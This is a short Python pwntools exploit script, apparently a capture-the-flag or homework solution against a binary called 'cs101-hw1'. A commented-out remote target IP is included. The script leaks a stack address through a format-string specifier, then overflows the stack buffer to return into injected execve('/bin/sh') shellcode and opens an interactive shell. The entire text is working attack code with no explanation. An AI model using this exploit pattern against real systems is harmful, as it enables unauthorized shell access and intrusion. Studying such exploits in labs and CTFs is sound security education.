from pwn import *

context.encoding = 'latin-1'
context.binary = "./cs101-hw1"
elf = context.binary
io = gdb.debug(elf.path)
#io = remote("18.216.238.24", 1001)
rop = ROP(elf)


OFFSET = 72
fmt_offset = 12

payload = b"%7$p"
payload += b"A" * (OFFSET - len(payload))
payload += p64(elf.sym.main)

io.clean()
io.sendline(payload)
io.recvuntilS("RESULT: ")
payload_addr = io.recvS(14)
payload_addr = int(payload_addr, 16)
info("leaked payload stack address: " + hex(payload_addr))
io.clean()

shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
payload = b"A" * 24
payload += asm(shellcraft.sh())
#payload += shellcode
payload += b"A" * (OFFSET - len(payload))
payload += p64(payload_addr)
io.sendline(payload)

io.interactive()